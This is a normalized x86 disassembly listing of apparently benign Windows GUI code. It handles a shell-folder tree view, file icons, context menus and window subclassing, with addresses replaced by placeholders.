mov ecx edx
shr ecx 0x1f
add edx ecx
cmp edi edx
jae r-xdata
mov ecx [ esp + 0x24 ]
xor eax eax
cmp ecx ebx
sete al
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov eax ebp
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov esi edx
mov edx ebp
sub edx esi
mov esi [ edi + 0x8 ]
cmp esi ecx
ja r-xdata
cmp ebp [ rw-data ]
je r-xdata
mov [ rw-data ] eax
sub esp 0x1c
mov ecx esp
lea eax [ esp + 0x80 ]
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
mov [ esp + 0x34 ] esp
mov [ ecx + 0x4 ] 0x0
lea ebp [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push 0x10
push eax
call [ edx + 0xc ]
mov esi eax
cmp esi ebx
je r-xdata
mov edi [ edi + 0x4 ]
mov ecx [ edi + ecx * 4 ]
cmp [ ecx + edx * 4 ] 0x0
je r-xdata
sub ecx esi
cmp eax 0x1e
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebp
push eax
lea eax [ esp + 0x84 ]
push eax
call sub_401e80
call sub_401530
add esp 0x1c
cmp eax 0x6
je r-xdata
mov eax [ esp + 0x17c ]
push 0x70
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
call sub_4b573e
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ eax * 4 ]
mov ecx ebp
sub ecx edx
cmp esi eax
ja r-xdata
test eax eax
jne r-xdata
mov eax ebx
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov esi edx
mov edx ebx
sub edx esi
mov esi [ rw-data ]
cmp esi ecx
ja r-xdata
mov eax [ esp + 0x178 ]
lea edx [ esp + 0x38 ]
push edx
push ebx
push 0x1007
or ebp 0xffffffff
mov [ esp + 0x48 ] edi
push eax
inc edi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x5c ] ebp
mov [ esp + 0x60 ] 0x104
mov [ esp + 0x64 ] ebp
mov [ esp + 0x68 ] esi
call [ SendMessageA@IAT ]
mov edx [ esp + 0x14 ]
mov esi eax
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x14 ]
cmp esi ebp
mov [ esp + 0x14 ] ebx
je r-xdata
cmp eax 0x7
je r-xdata
xor eax eax
mov ecx 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x6c ] ecx
mov [ eax + 0x68 ] ebx
mov [ eax + 0x58 ] 0x0
jmp r-xdata
mov edi [ esp + 0x2c ]
mov eax [ rw-data ]
jmp r-xdata
dec eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ edi + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ esp + 0x10 ]
mov esi [ edx ]
push ecx
push edx
call [ esi + 0x14 ]
mov ebx [ rw-data ]
sub eax esi
lea eax [ esp + 0x18 ]
push eax
mov ecx rw-data
call sub_431510
mov eax [ rw-data ]
inc eax
lea edx [ esp + 0x18 ]
push edx
mov ecx rw-data
call sub_431510
mov eax [ rw-data ]
mov ecx rw-data
mov [ rw-data ] ecx
jmp r-xdata
mov edi [ rw-data ]
mov ecx [ edi + ecx * 4 ]
xor ebp ebp
cmp [ ecx + edx * 4 ] ebp
je r-xdata
sub ecx esi
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
lea edx [ esp + 0x60 ]
push edx
lea edx [ esp + 0x18 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
je r-xdata
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] eax
mov ecx [ esp + 0x2c ]
add ecx ebp
push ecx
mov ecx eax
call sub_402540
lea edx [ esp + 0x38 ]
push edx
or eax 0xffffffff
push ebx
mov [ esp + 0x54 ] eax
mov [ esp + 0x5c ] eax
mov eax [ esp + 0x180 ]
push 0x1007
mov [ esp + 0x48 ] edi
push eax
inc edi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x60 ] 0x104
mov [ esp + 0x68 ] esi
call [ SendMessageA@IAT ]
add ebp 0x70
jmp r-xdata
mov ecx [ rw-data ]
dec ebp
cmp edi ecx
jne r-xdata
xor ebx ebx
mov [ rw-data ] ebx
xor ebx ebx
inc ebx
lea ecx [ esi * 4 ]
cmp ecx ebx
mov [ rw-data ] ebx
ja r-xdata
lea edx [ eax * 4 ]
sub ebx edx
cmp esi eax
ja r-xdata
mov ebp [ esp + 0x184 ]
mov ecx [ esi + 0x8 ]
and ecx 0xdfffffff
or ecx 0x4000000
mov [ esi + 0x8 ] ecx
dec [ rw-data ]
jne r-xdata
mov [ rw-data ] ebp
mov eax [ edi + eax * 4 ]
mov eax [ eax + ebx * 4 ]
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x14 ]
cmp [ rw-data ] ebp
je r-xdata
sub eax esi
mov [ rw-data ] ebp
jmp r-xdata
mov esi [ rw-data ]
mov ebx [ rw-data ]
sub_431c50
sub esp 0x290
push ebp
mov ebp [ esp + 0x2a0 ]
mov eax [ ebp + 0x8 ]
add eax 0x96
cmp eax 0x93
ja r-xdata
xor eax eax
pop ebp
add esp 0x290
retn
movzx eax [ eax + lookup_table_4322dc ]
push ebx
push esi
push edi
jmp [ eax * 4 + jump_table_4322c4 ]
lea ecx [ esp + 0x18 ]
push ecx
call [ GetCursorPos@IAT ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp ]
push ecx
push edx
mov [ esp + 0x2c ] eax
call [ ScreenToClient@IAT ]
mov ecx [ ebp ]
mov esi [ SendMessageA@IAT ]
lea eax [ esp + 0x20 ]
push eax
xor edi edi
push edi
push 0x1012
push ecx
call esi
test [ esp + 0x28 ] 0xe
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
call [ GetCursorPos@IAT ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp ]
push ecx
push edx
mov [ esp + 0x2c ] eax
call [ ScreenToClient@IAT ]
mov ecx [ ebp ]
mov esi [ SendMessageA@IAT ]
lea eax [ esp + 0x20 ]
push eax
push 0x0
push 0x1012
push ecx
call esi
test [ esp + 0x28 ] 0xe
je r-xdata
mov ecx [ esp + 0x2b0 ]
mov eax [ ebp + 0x10 ]
cmp [ ecx + 0xc ] eax
jne r-xdata
mov eax [ ebp ]
mov ecx [ ebp + 0xc ]
lea edx [ esp + 0x34 ]
push edx
xor ebx ebx
push ebx
push 0x1005
push eax
mov [ esp + 0x44 ] 0x4
mov [ esp + 0x48 ] ecx
mov [ esp + 0x4c ] ebx
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov ebx [ ebp + 0x2c ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp ]
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x34 ]
push eax
push edi
push 0x1005
push ecx
mov [ esp + 0x44 ] 0x4
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] edi
call esi
test eax eax
je r-xdata
mov ecx [ ebp ]
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x34 ]
push eax
push 0x0
push 0x1005
push ecx
mov [ esp + 0x44 ] 0x4
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] 0x0
call esi
test eax eax
je r-xdata
push eax
mov eax [ ebp ]
push ecx
push eax
call sub_431330
add esp 0xc
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
xor eax 0x8000
mov eax [ esp + 0x54 ]
cmp eax ebx
mov edi eax
mov [ esp + 0x10 ] edi
je r-xdata
test [ ebp + 0xc ] 0x2
mov esi [ ebx ]
mov [ esp + 0x2b0 ] esi
je r-xdata
mov ecx [ esp + 0x54 ]
cmp ecx edi
mov ebx ecx
jne r-xdata
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
mov esi [ eax + 0xc ]
cmp esi ebx
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
test [ ecx + 0x8 ] 0x20000000
je r-xdata
call sub_42e330
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x2a8 ]
push 0x1
add eax 0x4
push eax
mov eax [ esp + 0x2bc ]
mov ecx [ eax ]
push ecx
push edx
call sub_4323e0
add esp 0x14
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov eax [ edi + 0x4 ]
cmp eax ebx
mov esi [ esp + 0x2b4 ]
je r-xdata
mov eax [ esi + 0x6c ]
mov ebp 0x10
cmp eax ebp
jb r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0x3
ja r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
push 0x4009
push eax
push ecx
call sub_444350
add esp 0xc
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax [ ecx + 0xc ]
cmp eax edi
jne r-xdata
mov edx [ esp + 0x2b0 ]
mov eax [ edx ]
xor esi esi
cmp eax edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
je r-xdata
mov edx [ esi ]
push edi
push esi
call [ edx + 0x14 ]
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov ecx [ esi ]
push eax
push esi
call [ ecx + 0x14 ]
mov edi 0xf
mov [ esi + 0x6c ] edi
mov [ esi + 0x68 ] ebx
mov [ esi + 0x58 ] 0x0
cmp [ esi + 0x18 ] ebp
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp [ eax * 4 + jump_table_432370 ]
test [ ebx + 0x8 ] 0x20000
je r-xdata
or [ ebp + 0xc ] eax
mov [ ebp + 0x1c ] ecx
mov [ ebp + 0x18 ] 0x200
mov esi [ eax + 0x1c ]
lea edi [ eax + 0x4 ]
call sub_430f10
mov esi [ esp + 0x2b0 ]
jmp r-xdata
mov edi [ eax + 0x4 ]
mov esi [ eax + 0x1c ]
call sub_430f10
mov esi [ esp + 0x2b0 ]
jmp r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x2b0 ]
mov ecx [ eax + 0x4 ]
push edx
push ecx
call sub_444280
add esp 0x8
lea edx [ esp + 0x19c ]
mov esi eax
push edx
push esi
call [ SHGetPathFromIDListA@IAT ]
mov eax [ esp + 0x2b4 ]
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x14 ]
jmp r-xdata
cmp [ ebx + 0xc ] edi
je r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ eax ]
lea edi [ esp + 0x14 ]
push edi
push r--data
push esi
push ecx
push eax
call [ edx + 0x14 ]
xor edi edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] ebx
push esi
mov [ esi + 0x4 ] 0x0
call j_sub_4b66ed#2
mov edi [ esp + 0x14 ]
add esp 0x4
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x8 ]
test ecx 0x20000000
jne r-xdata
mov edx [ ebp + 0x20 ]
push edx
push ebx
call sub_430f50
add esp 0x8
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov ecx [ ebx + 0x8 ]
mov edx [ ebx + 0x4 ]
lea eax [ esp + 0x5c ]
push eax
mov eax [ esi ]
push ecx
push edx
push eax
call sub_430e70
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebx + 0x8 ]
test ch ch
jns r-xdata
or [ ebp + 0xc ] eax
mov [ ebp + 0x1c ] ecx
mov [ ebp + 0x18 ] 0x100
mov [ ebp + 0x28 ] eax
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0x18 ] 0x0
test [ ebx + 0x8 ] 0x10000
mov eax 0x8
mov ecx 0xf00
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push 0x1
lea eax [ esp + 0x1a0 ]
push 0xffffffff
push eax
call sub_425d10
add esp 0xc
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov eax [ esp + 0x2b0 ]
mov ecx [ eax + 0x4 ]
cmp ecx edi
je r-xdata
push 0x70
call sub_4b573e
add esp 0x4
cmp eax edi
je r-xdata
mov eax [ ebp + 0x20 ]
mov ecx [ ebx + 0x4 ]
mov edx [ esi ]
push eax
push 0x0
push ecx
push edx
call sub_4443d0
add esp 0x10
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov edx [ eax + 0x18 ]
mov ecx 0x10
cmp edx ecx
jb r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
lea edx [ esp + 0x74 ]
push edx
call sub_430de0
add esp 0x8
mov edi [ ebp + 0xc ]
mov edx [ ebp + 0x1c ]
mov ecx [ ebp + 0x18 ]
or edi eax
mov eax 0x4
or edx eax
or ecx eax
mov [ ebp + 0xc ] edi
mov [ ebp + 0x1c ] edx
mov [ ebp + 0x18 ] ecx
push eax
lea edx [ esp + 0x1a0 ]
push edx
call [ lstrcpyA@IAT ]
mov ecx [ rw-data ]
mov edi [ LockWindowUpdate@IAT ]
push ecx
call edi
mov edx [ ebx + 0x4 ]
mov eax [ ebp ]
push 0x0
push edx
push eax
call sub_42dfe0
mov ecx [ ebx + 0xc ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov eax [ esp + 0x2bc ]
push ecx
mov ecx [ ebp ]
push edx
push ebx
push eax
push ecx
call sub_431590
add esp 0x20
push 0x0
call edi
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_401510
jmp r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
lea edx [ esp + 0x5c ]
push edx
push ecx
mov ecx [ esi ]
push eax
push ecx
call sub_430e70
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x20 ]
mov edx [ eax + 0x20 ]
mov eax [ eax + 0x24 ]
push ecx
push edx
push eax
call sub_430e40
add esp 0xc
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
test esi esi
je r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
push eax
push ecx
call sub_444280
add esp 0x8
mov [ esp + 0x10 ] eax
mov edx [ ebx + 0xc ]
push edx
mov ecx eax
call sub_402540
cmp eax edi
mov esi eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] ecx
jb r-xdata
mov edx [ ebp + 0x20 ]
mov eax [ esp + 0x7c ]
mov ecx [ esp + 0x78 ]
push edx
push eax
push ecx
call sub_430e40
add esp 0xc
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
test ebx ebx
je r-xdata
mov eax [ esi + 0x6c ]
mov ebp 0x10
cmp eax ebp
jb r-xdata
push eax
call sub_457f90
mov edx [ ebp + 0x20 ]
add esp 0x4
add eax esi
push eax
push edx
call [ lstrcpyA@IAT ]
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov eax [ esp + 0x2b4 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x290
retn
mov edi 0xf
mov [ esi + 0x6c ] edi
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x58 ] 0x0
cmp [ esi + 0x18 ] ebp
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] 0x0
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_432380
mov eax [ esp + 0x4 ]
push esi
mov esi [ GetParent@IAT ]
push eax
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push edi
push eax
mov edi eax
call esi
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
retn
sub_4323b0
mov eax [ rw-data ]
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov edx [ esp + 0xc ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0xc ]
push edx
mov edx [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x18 ]
retn
sub_4323e0
sub esp 0x34
push ebx
mov ebx [ esp + 0x3c ]
push esi
push edi
xor edi edi
push ebx
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] edi
call [ GetParent@IAT ]
mov ecx [ esp + 0x48 ]
mov edx [ ecx ]
lea esi [ esp + 0x10 ]
push esi
mov esi [ esp + 0x50 ]
push edi
push r--data
push esi
mov esi [ esp + 0x60 ]
push esi
push eax
push ecx
mov [ esp + 0x34 ] eax
call [ edx + 0x28 ]
test eax eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0xc ]
push edx
push r--data
push eax
call [ ecx ]
mov esi eax
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp esi edi
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x34
retn
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebx
add esp 0x34
retn
call [ CreatePopupMenu@IAT ]
cmp eax edi
mov [ esp + 0x48 ] eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push ebp
mov ebp [ SendMessageA@IAT ]
push edi
push 0x9
push 0x110a
push ebx
mov esi 0x4
call ebp
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push esi
mov esi [ esp + 0x50 ]
push 0x7fff
push 0x1
push edi
push esi
push eax
call [ edx + 0xc ]
test eax eax
jl r-xdata
mov esi 0x14
mov eax [ esp + 0x4c ]
push eax
call [ DestroyMenu@IAT ]
pop ebp
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
push edi
push ecx
mov [ rw-data ] eax
mov eax [ esp + 0x60 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edi
push edx
push eax
push 0x102
push esi
mov [ esp + 0x34 ] 0x1
call [ TrackPopupMenu@IAT ]
mov esi eax
cmp esi edi
mov [ rw-data ] edi
je r-xdata
cmp esi 0x13
jne r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esi - 0x1 ]
movzx eax dx
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] 0x24
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] ecx
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] 0x1
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] edi
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
test eax eax
jge r-xdata
push edi
push 0x9
push 0x110a
push ebx
call ebp
push eax
push edi
push 0x110e
jmp r-xdata
cmp esi 0x12
jne r-xdata
mov [ esp + 0x18 ] edi
jmp r-xdata
push ebx
call ebp
push edi
push 0x9
push 0x110a
push ebx
call ebp
push eax
push edi
push 0x1101
sub_432590
sub esp 0x160
push 0x4001
push 0x160
lea eax [ esp + 0x8 ]
push eax
push 0x0
push r--data
call [ SHGetFileInfoA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x160
retn
mov ecx [ esp + 0x164 ]
push eax
push 0x0
push 0x1109
push ecx
call [ SendMessageA@IAT ]
mov eax 0x1
add esp 0x160
retn
sub_4325f0
sub esp 0x160
push ebx
push edi
mov edi ecx
test edi edi
mov ebx eax
jne r-xdata
mov ebx [ SHGetFileInfoA@IAT ]
push 0x4009
push 0x160
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push edi
call ebx
push 0x400b
push 0x160
lea edx [ esp + 0x10 ]
push edx
push 0x0
push edi
call ebx
mov eax [ esp + 0xc ]
pop edi
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
pop ebx
add esp 0x160
retn
mov ecx [ esi + 0x10 ]
mov edi [ SHGetFileInfoA@IAT ]
push 0x4011
push 0x160
lea eax [ esp + 0x10 ]
push eax
push ebx
push ecx
call edi
mov eax [ esi + 0x10 ]
push 0x4013
push 0x160
lea edx [ esp + 0x10 ]
push edx
push ebx
push eax
call edi
mov eax [ esp + 0xc ]
pop edi
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
pop ebx
add esp 0x160
retn
sub_432690
push esi
push edi
mov edi [ esp + 0xc ]
push edi
call [ lstrlenA@IAT ]
inc eax
push eax
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
push esi
call [ GlobalLock@IAT ]
push edi
push eax
call [ lstrcpyA@IAT ]
push esi
call [ GlobalUnlock@IAT ]
pop edi
mov eax esi
pop esi
retn
pop edi
pop esi
retn
sub_4326d0
mov eax [ esp + 0xc ]
sub esp 0x8
test eax eax
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
je r-xdata
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
xor ebp ebp
xor edi edi
test esi esi
mov [ esp + 0x10 ] ebp
jle r-xdata
add ebp 0x16
push ebp
push 0x42
call [ GlobalAlloc@IAT ]
xor ebp ebp
cmp eax ebp
mov [ esp + 0x14 ] eax
jne r-xdata
mov edi edi
add ebp ebp
jmp r-xdata
mov eax [ ebx + edi * 4 ]
push 0x0
push 0x0
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
add ebp eax
inc edi
cmp edi esi
jl r-xdata
push eax
call [ GlobalLock@IAT ]
mov ecx [ esp + 0x24 ]
cmp ecx ebp
mov [ eax ] 0x14
mov [ eax + 0x4 ] ebp
mov [ eax + 0x8 ] ebp
mov [ eax + 0xc ] ebp
mov [ eax + 0x10 ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov ecx [ ebx + edi * 4 ]
push ecx
call [ lstrlenA@IAT ]
inc edi
cmp edi esi
lea ebp [ eax + ebp + 0x1 ]
jl r-xdata
mov [ esp + 0x10 ] ebp
xor edi edi
test esi esi
lea ebp [ eax + 0x14 ]
jle r-xdata
test esi esi
lea edi [ eax + 0x14 ]
jle r-xdata
mov [ ebp ] 0x0
mov [ ebp + 0x1 ] 0x0
mov ecx [ ebx + edi * 4 ]
push ecx
push ebp
call [ lstrcpyA@IAT ]
mov edx [ ebx + edi * 4 ]
push edx
call [ lstrlenA@IAT ]
inc edi
cmp edi esi
lea ebp [ eax + ebp + 0x1 ]
jl r-xdata
mov [ edi ] 0x0
jmp r-xdata
jmp r-xdata
mov esi [ esp + 0x14 ]
push esi
call [ GlobalUnlock@IAT ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edx [ esp + 0x10 ]
mov eax [ ebx + ebp * 4 ]
push edx
push edi
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov edx [ esp + 0x10 ]
sub edx eax
inc ebp
cmp ebp esi
mov [ esp + 0x10 ] edx
lea edi [ edi + eax * 2 ]
jl r-xdata
sub_432800
mov eax [ esp + 0xc ]
mov cx [ esp + 0x4 ]
mov [ eax ] cx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] 0xffffffff
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] edx
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
mov [ eax + 0x4 ] esi
mov [ eax ] edx
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_432880
sub esp 0x208
push esi
mov esi [ esp + 0x210 ]
test esi esi
jne r-xdata
push ebp
mov ebp [ esp + 0x218 ]
test ebp ebp
jne r-xdata
or eax 0xffffffff
pop esi
add esp 0x208
retn 0xc
mov ecx [ esi + 0xc ]
mov edx ecx
xor eax eax
and edx 0x4000000
je r-xdata
pop ebp
mov eax 0x1
pop esi
add esp 0x208
retn 0xc
test ecx 0x20000000
je r-xdata
mov eax 0xfffffffb
jmp r-xdata
and ecx 0x77
cmp ecx 0x44
je r-xdata
mov eax 0xfffffff6
sub eax 0x14
cmp ecx 0x77
je r-xdata
test ecx 0x20000000
je r-xdata
add eax 0x5
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx ecx
and edx 0x4000000
je r-xdata
test edx edx
jne r-xdata
and ecx 0x77
cmp ecx 0x44
je r-xdata
add eax 0xa
sub eax 0x1e
jmp r-xdata
add eax 0x14
cmp ecx 0x77
je r-xdata
pop ebp
pop esi
add esp 0x208
retn 0xc
mov eax [ rw-data ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test edx edx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov edi [ esp + 0x220 ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
add eax 0x1e
jmp r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push eax
push edi
call sub_4443d0
add esp 0x10
lea esi [ esp + 0xc ]
jmp r-xdata
mov esi [ ebp + 0x4 ]
mov ecx [ esp + 0x21c ]
mov edx [ ecx ]
push esi
push eax
push 0x0
push ecx
call [ edx + 0x1c ]
test eax eax
jge r-xdata
mov esi r--data
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
pop ebp
movsx eax ax
pop esi
add esp 0x208
retn 0xc
pop ebp
xor eax eax
pop esi
add esp 0x208
retn 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
lea edx [ esp + 0x110 ]
push edx
push 0x0
push eax
push edi
call sub_4443d0
add esp 0x10
lea eax [ esp + 0x110 ]
jmp r-xdata
lea esi [ eax + 0x4 ]
jmp r-xdata
mov esi [ eax + 0x4 ]
jmp r-xdata
mov eax r--data
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp [ rw-data ] 0x2
pop edi
push eax
push esi
jne r-xdata
call sub_430900
xor edx edx
add esp 0x8
test eax eax
setge dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
call sub_430ad0
add esp 0x8
xor ecx ecx
test eax eax
setge cl
pop ebp
pop esi
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
add esp 0x208
retn 0xc
add eax 0x4
jmp r-xdata
mov eax [ eax + 0x4 ]
jmp r-xdata
sub_432a50
mov eax [ ecx ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x2d ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x2d ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x2d ]
test bl bl
je r-xdata
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_432ab0
mov eax [ ecx ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x2d ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x2d ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x2d ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_432b10
push esi
mov esi [ esp + 0xc ]
cmp esi 0x2
push edi
mov edi [ esp + 0xc ]
jne r-xdata
cmp esi 0x203
jne r-xdata
mov eax [ rw-data ]
push eax
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
jmp r-xdata
cmp esi 0x102
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
push edx
push eax
push esi
push edi
push ecx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
cmp [ rw-data ] 0x10
